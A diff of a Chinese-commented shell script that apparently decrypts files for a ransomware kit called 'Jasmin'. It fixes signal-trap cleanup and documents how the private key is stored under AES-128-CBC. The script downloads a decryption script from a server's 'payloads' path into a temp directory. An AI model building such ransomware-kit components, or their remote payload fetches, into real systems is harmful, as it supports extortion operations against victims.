@@ -55,7 +55,10 @@ TD="/tmp/.junlock_$$"
 chmod 700 "$TD"
 # 0700 是必须的：默认 umask 下 $TD 为 0755、解出的 priv.pem 为 0644，
 # 多用户机器上整个解密期间明文私钥都可被其他本地用户读取。
-trap 'rm -rf "$TD"' EXIT INT TERM
+# INT/TERM 必须显式 exit：只清目录不退出的话，处理器执行完会【继续往下走】，
+# 而此时 $TD/dec.sh 与已解出的私钥已被删除 —— 后续每个文件都因缺私钥而失败。
+trap 'rm -rf "$TD"' EXIT
+trap 'rm -rf "$TD"; exit 130' INT TERM
 
 DL(){
     # -f / --fail：HTTP >= 400 时 curl 返回非零，且不把错误正文写进输出文件。
@@ -81,8 +84,10 @@ DL "$SRV/payloads/jasmin_decrypt_openssl.sh" "$TD/dec.sh" || { echo "[!] Failed 
 
 # ── 解开私钥 ──
 # 存储格式: base64( IV(16B) + AES-CBC密文 )，PKCS7 padding
-# PHP 端 keygen 用 aes-256-cbc + 32个ASCII字节；Python 端用 AES-128 + fromhex(K)。
-# 这里两种都试，谁解出合法 PEM 用谁。
+# 两端实现【一致】：AES-128-CBC，密钥 = K 的十六进制解码后的 16 字节
+# （keygen.php: openssl_encrypt(..., 'aes-128-cbc', hex2bin($K))；
+#   app.py keygen: secrets.token_hex(16) -> 16 字节）。下面第一条即常态；
+# 第二条 aes-256-cbc 只是早期构建的历史格式兜底，保留以便打开旧备份。
 echo "[*] Decrypting private key (AES)..."
 openssl base64 -d -A -in "$TD/k.enc" -out "$TD/blob" 2>/dev/null || { echo "[!] base64 decode failed"; exit 1; }
 dd if="$TD/blob" bs=1 count=16 2>/dev/null > "$TD/iv"
